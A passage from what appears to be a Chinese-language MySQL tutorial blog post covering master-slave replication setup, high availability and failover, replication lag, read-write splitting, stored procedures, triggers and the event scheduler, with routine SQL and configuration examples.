默认推荐方式</li></ul><p>查看当前设置：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;binlog_format&#x27;</span>;</span><br></pre></td></tr></table></figure><hr><h2 id="设置主从的基本流程"><a href="#设置主从的基本流程" class="headerlink" title="设置主从的基本流程"></a>设置主从的基本流程</h2><p>以下是 MySQL 主从复制的基础步骤（简化）：</p><ol><li>主库开启 Binlog，并设置唯一 server-id</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">server-id=1</span><br><span class="line">log-bin=mysql-bin</span><br></pre></td></tr></table></figure><ol><li>从库设置不同的 server-id</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">server-id=2</span><br></pre></td></tr></table></figure><ol><li>在主库创建复制账号：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;repl&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> REPLICATION SLAVE <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;repl&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure><ol><li>从库指定主库信息：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CHANGE MASTER <span class="keyword">TO</span></span><br><span class="line">  MASTER_HOST<span class="operator">=</span><span class="string">&#x27;主库IP&#x27;</span>,</span><br><span class="line">  MASTER_USER<span class="operator">=</span><span class="string">&#x27;repl&#x27;</span>,</span><br><span class="line">  MASTER_password: <span class="string">&#x27;********&#x27;</span></span><br><span class="line">  MASTER_LOG_FILE<span class="operator">=</span><span class="string">&#x27;mysql-bin.000001&#x27;</span>,</span><br><span class="line">  MASTER_LOG_POS<span class="operator">=</span><span class="number">123</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">START</span> SLAVE;</span><br></pre></td></tr></table></figure><ol><li>检查状态：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> SLAVE STATUS\G</span><br></pre></td></tr></table></figure><hr><h2 id="高可用架构的常见方式"><a href="#高可用架构的常见方式" class="headerlink" title="高可用架构的常见方式"></a>高可用架构的常见方式</h2><h3 id="单主多从-读写分离"><a href="#单主多从-读写分离" class="headerlink" title="单主多从 + 读写分离"></a>单主多从 + 读写分离</h3><ul><li>写操作集中在主库</li><li>读操作分发到多个从库</li><li>可以通过中间件实现（如 MyCat、ProxySQL、Atlas）</li></ul><h3 id="MGR（Group-Replication）"><a href="#MGR（Group-Replication）" class="headerlink" title="MGR（Group Replication）"></a>MGR（Group Replication）</h3><p>MySQL 官方推出的高可用方案，支持自动主从切换，事务强一致性，适合对数据同步非常敏感的业务。</p><h3 id="双主复制（主主）"><a href="#双主复制（主主）" class="headerlink" title="双主复制（主主）"></a>双主复制（主主）</h3><ul><li>两个节点互为主从</li><li>可实现多点写入</li><li>需要特别小心数据冲突（如自增主键）</li></ul><hr><h2 id="故障切换方案设计"><a href="#故障切换方案设计" class="headerlink" title="故障切换方案设计"></a>故障切换方案设计</h2><h3 id="手动切换（最常见）"><a href="#手动切换（最常见）" class="headerlink" title="手动切换（最常见）"></a>手动切换（最常见）</h3><ul><li>运维通过监控发现主库异常</li><li>提升一个从库为主库</li><li>改变业务的连接配置</li></ul><h3 id="自动切换"><a href="#自动切换" class="headerlink" title="自动切换"></a>自动切换</h3><ul><li>借助高可用组件如 <strong>MHA</strong>（MySQL High Availability）</li><li>或 Kubernetes + StatefulSet 做自动恢复</li></ul><p>自动化虽好，但也增加了复杂度和运维成本。</p><hr><h2 id="主从延迟的问题"><a href="#主从延迟的问题" class="headerlink" title="主从延迟的问题"></a>主从延迟的问题</h2><p>从库复制是异步的，因此可能会出现延迟。表现为：</p><ul><li>主库刚写完数据，从库查不到</li><li>某些业务逻辑依赖写后读就会出问题（比如下单后立即查订单）</li></ul><p>解决方案：</p><ul><li>用读写分离中间件支持“读主”策略</li><li>或在必要时手动读主库（比如订单类逻辑）</li></ul><p>查看延迟时间：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> SLAVE STATUS\G</span><br><span class="line"><span class="comment">-- 关注 Seconds_Behind_Master 字段</span></span><br></pre></td></tr></table></figure><hr><h2 id="常见问题汇总"><a href="#常见问题汇总" class="headerlink" title="常见问题汇总"></a>常见问题汇总</h2><h3 id="为什么主从会出现不一致？"><a href="#为什么主从会出现不一致？" class="headerlink" title="为什么主从会出现不一致？"></a>为什么主从会出现不一致？</h3><ul><li>主库用了不确定函数（如 RAND(), UUID(), NOW()）</li><li>手动修改了从库数据</li><li>使用了 SBR 格式但 SQL 语义不稳定</li></ul><p>建议使用 ROW 格式可避免多数问题。</p><h3 id="如何避免主键冲突"><a href="#如何避免主键冲突" class="headerlink" title="如何避免主键冲突"></a>如何避免主键冲突</h3><p>双主架构下可能有主键冲突，这时可以使用奇偶数或步长策略，例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auto_increment_increment<span class="operator">=</span><span class="number">2</span></span><br><span class="line">auto_increment_offset<span class="operator">=</span><span class="number">1</span>  <span class="comment">-- 主库1</span></span><br><span class="line">auto_increment_offset<span class="operator">=</span><span class="number">2</span>  <span class="comment">-- 主库2</span></span><br></pre></td></tr></table></figure><h3 id="从库宕机后还能追上吗"><a href="#从库宕机后还能追上吗" class="headerlink" title="从库宕机后还能追上吗"></a>从库宕机后还能追上吗</h3><p>能。只要主库的 Binlog 还在，从库恢复后可继续同步。如果 Binlog 被清理，就需要重新做一次全量 + 增量同步。</p><hr><h1 id="读写分离-1"><a href="#读写分离-1" class="headerlink" title="读写分离"></a>读写分离</h1><p><strong>MySQL 原生并不会自动把读请求分发到从库</strong>，它只是提供了主从复制的能力，<strong>读写分离是要自己做的</strong>，通常通过以下3种方式实现。</p><p><strong>1. 应用层手动分发</strong></p><p>最常见也最灵活的做法，在业务代码中写明哪些操作走主库、哪些走从库。</p><p>例如：</p><ul><li>查询类接口走从库连接池</li><li>写操作（新增、更新、删除）走主库连接池</li></ul><p>优点：</p><ul><li>可控、灵活、便于定制（比如特定查询强制走主）</li></ul><p>缺点：</p><ul><li>应用逻辑复杂度变高</li><li>容易出现开发遗漏，导致数据不一致问题</li></ul><hr><p><strong>2. 中间件代理</strong></p><p>借助数据库中间件实现自动的读写分离路由：</p><ul><li><strong>MyCat</strong></li><li><strong>ShardingSphere-Proxy</strong></li><li><strong>ProxySQL</strong></li><li><strong>Atlas（美团开源）</strong></li></ul><p>它们的作用是作为“数据库代理层”，接收 SQL 请求，根据 SQL 类型自动判断读写，转发给主库或从库。</p><p>优点：</p><ul><li>与业务代码无耦合</li><li>具备连接池、负载均衡等能力</li></ul><p>缺点：</p><ul><li>配置复杂度略高</li><li>性能取决于中间件本身</li></ul><hr><p><strong>3. 数据库驱动层支持（少见）</strong></p><p>部分语言的数据库驱动或 ORM 框架支持配置多个数据源，并自动根据查询类型路由。</p><p>如：</p><ul><li>Spring Boot + MyBatis 可以配置多数据源</li><li>Laravel、Django 等也可以通过插件方式实现读写分离</li></ul><p>不过这种方案本质上还是靠“程序逻辑”判断，没有数据库层的智能调度。</p><p><strong>延迟感知问题</strong></p><p>读写分离时还需要考虑 <strong>主从延迟</strong>：</p><ul><li>如果写完订单立刻查详情，查的是从库，可能还没同步到</li><li>可能导致“刚写入就查不到”的现象</li></ul><p>常见做法：</p><ul><li>核心流程强制读主（如订单&#x2F;支付&#x2F;登录）</li><li>异步操作或非关键接口放宽一致性要求</li></ul><hr><h1 id="存储过程"><a href="#存储过程" class="headerlink" title="存储过程"></a>存储过程</h1><h2 id="什么是存储过程？"><a href="#什么是存储过程？" class="headerlink" title="什么是存储过程？"></a>什么是存储过程？</h2><p>存储过程就是：</p><p>一段<strong>事先定义好、存储在数据库中</strong>的 SQL 代码，可以像函数一样被调用。</p><p>常用于：</p><ul><li>封装复杂的业务逻辑（如多表联合处理）</li><li>实现一些批量处理任务</li><li>降低客户端与数据库之间的通信成本</li></ul><p>写一次，可以在多个地方复用，还能避免把复杂 SQL 写死在业务代码中。</p><hr><h2 id="创建存储过程的基本语法"><a href="#创建存储过程的基本语法" class="headerlink" title="创建存储过程的基本语法"></a>创建存储过程的基本语法</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> proc_example()</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">SELECT</span> NOW();</span><br><span class="line"><span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure><p>解释说明：</p><ul><li><code>DELIMITER //</code> 是为了避免 <code>;</code> 被误当成语句结束符</li><li><code>BEGIN ... END</code> 包裹逻辑体</li><li><code>proc_example</code> 是过程名，可被调用</li></ul><p>调用方式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CALL</span> proc_example();</span><br></pre></td></tr></table></figure><hr><h2 id="参数类型支持"><a href="#参数类型支持" class="headerlink" title="参数类型支持"></a>参数类型支持</h2><p>存储过程支持 3 种参数类型：</p><ul><li><code>IN</code>：传入参数（默认）</li><li><code>OUT</code>：返回结果用</li><li><code>INOUT</code>：传入传出都可以</li></ul><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> greet_user(<span class="keyword">IN</span> username <span class="type">VARCHAR</span>(<span class="number">50</span>))</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">SELECT</span> CONCAT(<span class="string">&#x27;Hello, &#x27;</span>, username);</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure><p>带返回值的例子：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> double_value(<span class="keyword">IN</span> input <span class="type">INT</span>, <span class="keyword">OUT</span> <span class="keyword">result</span> <span class="type">INT</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">SET</span> <span class="keyword">result</span> <span class="operator">=</span> input <span class="operator">*</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 调用方式（MySQL 变量用 @）</span></span><br><span class="line"><span class="keyword">CALL</span> double_value(<span class="number">5</span>, <span class="variable">@res</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="variable">@res</span>;</span><br></pre></td></tr></table></figure><hr><h2 id="存储过程里的控制语句"><a href="#存储过程里的控制语句" class="headerlink" title="存储过程里的控制语句"></a>存储过程里的控制语句</h2><p>可以像写程序一样控制流程：</p><ul><li>条件判断：<code>IF ... THEN ... ELSE ... END IF</code></li><li>循环：<code>WHILE</code>、<code>LOOP</code>、<code>REPEAT</code></li><li>局部变量：<code>DECLARE</code></li></ul><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> loop_counter()</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">DECLARE</span> i <span class="type">INT</span> <span class="keyword">DEFAULT</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  WHILE i <span class="operator">&lt;=</span> <span class="number">5</span> DO</span><br><span class="line">    <span class="keyword">SELECT</span> CONCAT(<span class="string">&#x27;Loop &#x27;</span>, i);</span><br><span class="line">    <span class="keyword">SET</span> i <span class="operator">=</span> i <span class="operator">+</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">END</span> WHILE;</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure><hr><h2 id="查看与删除存储过程"><a href="#查看与删除存储过程" class="headerlink" title="查看与删除存储过程"></a>查看与删除存储过程</h2><p>查看已有存储过程：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">PROCEDURE</span> STATUS <span class="keyword">WHERE</span> Db <span class="operator">=</span> <span class="string">&#x27;数据库名&#x27;</span>;</span><br></pre></td></tr></table></figure><p>查看具体定义：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> proc_name;</span><br></pre></td></tr></table></figure><p>删除存储过程：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">PROCEDURE</span> IF <span class="keyword">EXISTS</span> proc_name;</span><br></pre></td></tr></table></figure><hr><h2 id="使用存储过程的优缺点"><a href="#使用存储过程的优缺点" class="headerlink" title="使用存储过程的优缺点"></a>使用存储过程的优缺点</h2><h3 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h3><ul><li>提高代码复用性，避免重复 SQL</li><li>执行速度快（预编译）</li><li>减少应用与数据库的通信频率</li></ul><h3 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h3><ul><li>可维护性较差（逻辑隐藏在数据库里）</li><li>不利于版本控制（部署升级不方便）</li><li>调试不如应用层灵活</li><li>写法偏 SQL 风格，不如高级语言易写易读</li></ul><hr><h2 id="适合使用存储过程的场景"><a href="#适合使用存储过程的场景" class="headerlink" title="适合使用存储过程的场景"></a>适合使用存储过程的场景</h2><ul><li>批量导入导出</li><li>数据迁移、归档</li><li>报表类查询逻辑封装</li><li>和第三方数据库集成时对外暴露“数据库接口”</li></ul><hr><h1 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h1><p>一种 <strong>基于事件驱动</strong> 的数据库对象，当指定表发生某些操作（如插入、更新、删除）时，会<strong>自动执行事先定义好的 SQL 逻辑</strong>，无需应用显式调用。</p><p>简单说，就是数据库自带的“监听器”。</p><hr><h2 id="触发器适合用在哪？"><a href="#触发器适合用在哪？" class="headerlink" title="触发器适合用在哪？"></a>触发器适合用在哪？</h2><p>常见场景：</p><ul><li>数据变动时自动记录日志</li><li>自动补充派生字段（如更新订单状态时同步更新时间）</li><li>做数据校验或限制（虽然现在推荐在应用层做）</li><li>简单的数据同步（如将数据同时写入两张表）</li></ul><hr><h2 id="支持哪些事件类型"><a href="#支持哪些事件类型" class="headerlink" title="支持哪些事件类型"></a>支持哪些事件类型</h2><p>MySQL 支持 6 类触发事件：</p><table><thead><tr><th>触发时机</th><th>操作类型</th></tr></thead><tbody><tr><td>BEFORE</td><td>INSERT、UPDATE、DELETE</td></tr><tr><td>AFTER</td><td>INSERT、UPDATE、DELETE</td></tr></tbody></table><p>注意：<strong>每个表、每个操作类型、每个时机</strong> 只能创建一个触发器。例如：一张表只能有一个 <code>AFTER INSERT</code> 触发器。</p><hr><h2 id="创建触发器的语法"><a href="#创建触发器的语法" class="headerlink" title="创建触发器的语法"></a>创建触发器的语法</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> trg_after_insert_user</span><br><span class="line">AFTER <span class="keyword">INSERT</span> <span class="keyword">ON</span> users</span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">INSERT INTO</span> user_logs(user_id, action, created_at)</span><br><span class="line">  <span class="keyword">VALUES</span> (NEW.id, <span class="string">&#x27;insert&#x27;</span>, NOW());</span><br><span class="line"><span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li><code>AFTER INSERT ON users</code> 表示在 <code>users</code> 表插入数据后触发</li><li><code>FOR EACH ROW</code> 表示每插入一行就执行一次</li><li><code>NEW</code> 代表新数据，<code>OLD</code> 代表旧数据（适用于 UPDATE 和 DELETE）</li></ul><hr><h2 id="示例：UPDATE-时记录变更"><a href="#示例：UPDATE-时记录变更" class="headerlink" title="示例：UPDATE 时记录变更"></a>示例：UPDATE 时记录变更</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> trg_before_update_user</span><br><span class="line">BEFORE <span class="keyword">UPDATE</span> <span class="keyword">ON</span> users</span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">INSERT INTO</span> user_logs(user_id, action, old_name, new_name, changed_at)</span><br><span class="line">  <span class="keyword">VALUES</span> (</span><br><span class="line">    OLD.id,</span><br><span class="line">    <span class="string">&#x27;update&#x27;</span>,</span><br><span class="line">    OLD.name,</span><br><span class="line">    NEW.name,</span><br><span class="line">    NOW()</span><br><span class="line">  );</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure><p>在用户信息更新之前，自动把名字变更记录保存到 <code>user_logs</code>。</p><hr><h2 id="删除和查看触发器"><a href="#删除和查看触发器" class="headerlink" title="删除和查看触发器"></a>删除和查看触发器</h2><p>查看触发器：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> TRIGGERS;</span><br></pre></td></tr></table></figure><p>查看某个触发器定义：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> trg_name;</span><br></pre></td></tr></table></figure><p>删除触发器：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TRIGGER</span> IF <span class="keyword">EXISTS</span> trg_name;</span><br></pre></td></tr></table></figure><hr><h2 id="常见问题与限制"><a href="#常见问题与限制" class="headerlink" title="常见问题与限制"></a>常见问题与限制</h2><h3 id="是否支持修改触发器？"><a href="#是否支持修改触发器？" class="headerlink" title="是否支持修改触发器？"></a>是否支持修改触发器？</h3><p>不支持 <code>ALTER TRIGGER</code>，只能 <code>DROP</code> 再 <code>CREATE</code>。</p><h3 id="是否支持事务？"><a href="#是否支持事务？" class="headerlink" title="是否支持事务？"></a>是否支持事务？</h3><p>触发器执行是在事务中完成的。如果主操作回滚，触发器执行的内容也会被回滚。</p><h3 id="是否能在触发器中调用存储过程？"><a href="#是否能在触发器中调用存储过程？" class="headerlink" title="是否能在触发器中调用存储过程？"></a>是否能在触发器中调用存储过程？</h3><p>可以调用，但建议避免太复杂的逻辑，防止性能问题或死锁。</p><h3 id="是否支持对视图使用触发器？"><a href="#是否支持对视图使用触发器？" class="headerlink" title="是否支持对视图使用触发器？"></a>是否支持对视图使用触发器？</h3><p>不支持，触发器只能应用在 <strong>基表</strong> 上，不能绑定到视图或临时表。</p><h3 id="是否可以控制触发顺序？"><a href="#是否可以控制触发顺序？" class="headerlink" title="是否可以控制触发顺序？"></a>是否可以控制触发顺序？</h3><p>不可以。MySQL 不支持同一类事件的多个触发器（不像 Oracle &#x2F; PostgreSQL 那样可以定义多个并排序）。</p><hr><h2 id="使用触发器的建议"><a href="#使用触发器的建议" class="headerlink" title="使用触发器的建议"></a>使用触发器的建议</h2><ul><li>尽量保持触发逻辑简单、快速</li><li>加入异常处理，防止触发器失败导致主操作失败</li><li>避免级联触发（一个触发器再触发另一个），否则调试困难</li><li>用于<strong>审计日志</strong>、<strong>数据归档</strong> 是较好的应用场景</li></ul><hr><h1 id="事件调度器"><a href="#事件调度器" class="headerlink" title="事件调度器"></a>事件调度器</h1><p>事件调度器（Event Scheduler）是一种 MySQL 内置的 <strong>定时执行 SQL 语句</strong> 的机制，可以在指定时间点或时间间隔自动运行某段 SQL，不依赖外部应用或操作系统。</p><p>它有点像数据库版本的 <code>crontab</code>，但是写在数据库里的。</p><hr><h2 id="使用事件调度器的前提：先开启它"><a href="#使用事件调度器的前提：先开启它" class="headerlink" title="使用事件调度器的前提：先开启它"></a>使用事件调度器的前提：先开启它</h2><p>默认可能是关闭状态，可以通过以下方式开启：</p><h3 id="查看当前状态"><a href="#查看当前状态" class="headerlink" title="查看当前状态"></a>查看当前状态</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;event_scheduler&#x27;</span>;</span><br></pre></td></tr></table></figure><p>如果返回 <code>OFF</code>，说明没开。</p><h3 id="启用方式（临时）"><a href="#启用方式（临时）" class="headerlink" title="启用方式（临时）"></a>启用方式（临时）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> event_scheduler <span class="operator">=</span> <span class="keyword">ON</span>;</span><br></pre></td></tr></table></figure><h3 id="启用方式（永久）"><a href="#启用方式（永久）" class="headerlink" title="启用方式（永久）"></a>启用方式（永久）</h3><p>在配置文件（如 <code>my.cnf</code>）中添加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event_scheduler = ON</span><br></pre></td></tr></table></figure><hr><h2 id="创建事件的基本语法"><a href="#创建事件的基本语法" class="headerlink" title="创建事件的基本语法"></a>创建事件的基本语法</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> EVENT IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> event_clear_logs</span><br><span class="line"><span class="keyword">ON</span> SCHEDULE <span class="keyword">EVERY</span> <span class="number">1</span> <span class="keyword">DAY</span></span><br><span class="line">STARTS <span class="built_in">CURRENT_TIMESTAMP</span> <span class="operator">+</span> <span class="type">INTERVAL</span> <span class="number">1</span> <span class="keyword">HOUR</span></span><br><span class="line">DO</span><br><span class="line">  <span class="keyword">DELETE</span> <span class="keyword">FROM</span> user_logs <span class="keyword">WHERE</span> created_at <span class="operator">&lt;</span> NOW() <span class="operator">-</span> <span class="type">INTERVAL</span> <span class="number">30</span> <span class="keyword">DAY</span>;</span><br></pre></td></tr></table></figure><p>解释：</p><ul><li><code>ON SCHEDULE EVERY 1 DAY</code>：每 1 天执行一次</li><li><code>STARTS</code> 指定起始时间（可选）</li><li><code>DO</code> 后面是要执行的 SQL 语句</li></ul><p>这条语句的作用是：每天清理一次 30 天前的日志。</p><hr><h2 id="常用的调度方式"><a href="#常用的调度方式" class="headerlink" title="常用的调度方式"></a>常用的调度方式</h2><h3 id="1-每隔固定时间执行一次"><a href="#1-每隔固定时间执行一次" class="headerlink" title="1. 每隔固定时间执行一次"></a>1. 每隔固定时间执行一次</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ON</span> SCHEDULE <span class="keyword">EVERY</span> <span class="number">10</span> <span class="keyword">MINUTE</span></span><br></pre></td></tr></table></figure><h3 id="2-固定时间点执行一次（只执行一次）"><a href="#2-固定时间点执行一次（只执行一次）" class="headerlink" title="2. 固定时间点执行一次（只执行一次）"></a>2. 固定时间点执行一次（只执行一次）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ON</span> SCHEDULE <span class="keyword">AT</span> <span class="type">TIMESTAMP</span> <span class="string">&#x27;2025-04-11 00:00:00&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="3-设置结束时间（任务失效）"><a href="#3-设置结束时间（任务失效）" class="headerlink" title="3. 设置结束时间（任务失效）"></a>3. 设置结束时间（任务失效）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ENDS <span class="built_in">CURRENT_TIMESTAMP</span> <span class="operator">+</span> <span class="type">INTERVAL</span> <span class="number">30</span> <span class="keyword">DAY</span></span><br></pre></td></tr></table></figure><hr><h2 id="启用、禁用和删除事件"><a href="#启用、禁用和删除事件" class="headerlink" title="启用、禁用和删除事件"></a>启用、禁用和删除事件</h2><h3 id="启用事件（默认创建时是-ENABLED）"><a href="#启用事件（默认创建时是-ENABLED）" class="headerlink" title="启用事件（默认创建时是 ENABLED）"></a>启用事件（默认创建时是 ENABLED）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> EVENT event_clear_logs ENABLE;</span><br></pre></td></tr></table></figure><h3 id="禁用事件"><a href="#禁用事件" class="headerlink" title="禁用事件"></a>禁用事件</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> EVENT event_clear_logs DISABLE;</span><br></pre></td></tr></table></figure><h3 id="删除事件"><a href="#删除事件" class="headerlink" title="删除事件"></a>删除事件</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> EVENT IF <span class="keyword">EXISTS</span> event_clear_logs;</span><br></pre></td></tr></table></figure><hr><h2 id="示例：每小时检查超时订单并更新状态"><a href="#示例：每小时检查超时订单并更新状态" class="headerlink" title="示例：每小时检查超时订单并更新状态"></a>示例：每小时检查超时订单并更新状态</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> EVENT check_timeout_orders</span><br><span class="line"><span class="keyword">ON</span> SCHEDULE <span class="keyword">EVERY</span> <span class="number">1</span> <span class="keyword">HOUR</span></span><br><span class="line">DO</span><br><span class="line">  <span class="keyword">UPDATE</span> orders</span><br><span class="line">  <span class="keyword">SET</span> status <span class="operator">=</span> <span class="string">&#x27;expired&#x27;</span></span><br><span class="line">  <span class="keyword">WHERE</span> status <span class="operator">=</span> <span class="string">&#x27;pending&#x27;</span> <span class="keyword">AND</span> created_at <span class="operator">&lt;</span> NOW() <span class="operator">-</span> <span class="type">INTERVAL</span> <span class="number">2</span> <span class="keyword">HOUR</span>;</span><br></pre></td></tr></table></figure><hr><h2 id="事件调度器适合哪些任务？"><a href="#事件调度器适合哪些任务？" class="headerlink" 